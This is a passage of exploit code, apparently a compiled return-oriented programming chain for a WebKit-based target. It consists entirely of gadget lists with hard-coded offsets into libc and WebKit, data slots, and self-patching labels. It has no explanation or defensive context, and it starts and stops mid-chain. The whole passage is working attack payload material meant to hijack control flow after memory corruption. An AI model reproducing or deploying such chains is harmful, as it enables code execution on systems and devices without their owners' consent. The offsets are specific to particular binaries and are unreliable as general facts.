libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78024, //L307
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78040, //L309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L307:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78184, //L312
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78152, //L310
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78168, //L311
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L310:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L311:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L312:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+78256, //L313
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L313:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78312, //L316
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L316:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+78408, //L319
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L318:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L319:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+78496, //L320
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78512, //L322
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L320:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+78664, //L324
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78696, //L326
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+78648, //L323
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+78680, //L325
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L323:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L324:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L325:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L326:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+78816, //L328
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+78832, //L329
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+78800, //L327
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L327:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L328:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L329:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+78920, //L330
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+78976, //L333
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L333:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+79096, //L334
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79128, //L336
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79112, //L335
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L334:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L335:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L336:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+79288, //L340
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+79240, //L337
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79256, //L338
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L337:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L338:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L339:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79344, //L342
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L342:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79448, //L343
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79480, //L345
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79464, //L344
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L343:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L344:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L345:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79640, //L349
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79592, //L346
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79608, //L347
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L346:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L347:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L348:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L349:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+79696, //L351
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L351:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+79800, //L352
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+79832, //L354
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79816, //L353
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L352:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L353:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L354:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+79992, //L358
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+79944, //L355
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+79960, //L356
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L355:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L356:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L357:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L358:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80048, //L360
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L360:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80152, //L361
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80184, //L363
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80168, //L362
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L361:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L362:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L363:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80256, //L364
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80272, //L365
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L364:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L365:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80432, //L369
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+80384, //L366
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80400, //L367
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L366:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L367:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L368:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L369:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+80488, //L371
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+80592, //L372
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+80624, //L374
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80608, //L373
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L372:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L373:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L374:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+80720, //L376
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+80704, //L375
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L375:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L376:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+80816, //L379
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L378:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+80904, //L380
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+80920, //L382
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L380:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L382:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+81064, //L385
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81032, //L383
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81048, //L384
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L383:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L384:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L385:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+81136, //L386
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L386:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81192, //L389
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L389:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L390:
db([7, 0]); // 0x7
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+81336, //L393
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L392:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L393:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+81424, //L394
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81440, //L396
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L394:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L396:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+81592, //L398
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81624, //L400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+81576, //L397
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+81608, //L399
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L397:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L398:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L399:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L400:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+81744, //L402
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81760, //L403
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+81728, //L401
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L401:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L402:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L403:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+81864, //L404
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+81880, //L405
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L404:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L405:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+81968, //L406
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82024, //L409
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L409:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82096, //L410
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L410:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+82152, //L413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+82256, //L416
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L415:
db([4294967283, 4294967295]); // -0xd
set_gadget(libc_base+792472,); //pop rcx
//L416:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+82344, //L417
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82360, //L419
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L417:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L419:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+82520, //L423
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+82472, //L420
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82488, //L421
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L420:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L421:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L422:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L423:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82576, //L425
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L425:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+82680, //L426
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+82712, //L428
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82696, //L427
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L426:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L427:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L428:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+82872, //L432
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+82824, //L429
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+82840, //L430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L429:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L431:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+82928, //L434
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L434:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83032, //L435
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83064, //L437
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83048, //L436
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L435:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L436:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L437:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83136, //L438
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83152, //L439
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L438:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L439:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83312, //L443
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83264, //L440
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83280, //L441
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L440:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L441:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L442:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+83368, //L445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L445:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+83472, //L446
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+83504, //L448
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83488, //L447
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L446:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L447:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L448:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+83600, //L450
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+83584, //L449
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L449:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L450:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+83696, //L453
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L452:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L453:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+83784, //L454
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83800, //L456
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L454:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L456:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+83944, //L459
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+83912, //L457
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+83928, //L458
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L457:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L458:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L459:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84016, //L460
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L460:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84072, //L463
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L463:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+84168, //L466
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L465:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+792472,); //pop rcx
//L466:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+84256, //L467
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84272, //L469
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+84424, //L471
